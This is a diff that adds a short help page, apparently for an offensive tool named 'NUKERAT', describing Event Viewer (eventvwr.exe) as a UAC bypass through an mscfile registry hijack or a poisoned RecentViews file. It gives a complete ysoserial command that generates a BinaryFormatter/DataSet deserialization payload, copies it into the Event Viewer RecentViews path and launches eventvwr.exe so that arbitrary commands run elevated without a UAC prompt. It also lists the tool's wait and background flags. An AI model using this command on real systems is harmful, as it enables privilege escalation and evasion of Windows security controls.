@@ -1,0 +1,19 @@
+ABOUT
+    Event Viewer MMC launcher.
+    mscfile registry hijack or poisoned RecentViews deserialization runs
+    elevated code without UAC.
+
+USAGE:
+    eventvwr.exe
+    ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c "{CMD}" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe
+
+EXAMPLES:
+    eventvwr.exe
+    ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c "{CMD}" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    eventvwr.exe
